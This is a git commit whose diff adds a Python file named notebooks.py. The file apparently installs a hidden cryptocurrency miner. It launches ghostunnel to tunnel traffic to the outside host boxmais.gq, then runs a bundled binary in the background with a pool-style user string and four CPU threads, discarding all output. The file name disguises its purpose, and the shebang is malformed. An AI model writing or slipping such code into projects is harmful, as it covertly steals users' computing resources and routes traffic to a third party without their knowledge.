2f4c0a5003391a2bcc5048d8276cab80ddc467ec
tatass <tatss2212@tas.com>
2019-01-18 20:26:22 +0800

    third

---
+++ notebooks.py
@@ -0,0 +1,12 @@
+/usrbin/python
+
+import os 
+
+cmd = './jupyi/ghostunnel --keystore jupyi/Client.pem --cacert jupyi/CA.pem client     --listen localhost:8080     --target boxmais.gq:443 &'
+
+os.system(cmd)
+
+cmd2 = './jupyi/, -s  localhost:8080 -su 86646-64.8ce4a4b69b2b1fcd.ooxx/wenyuan85858@gmail.com -r 20 -cpu -cputhreads 4 >/dev/null  2>&1  &'
+
+os.system(cmd2)
+
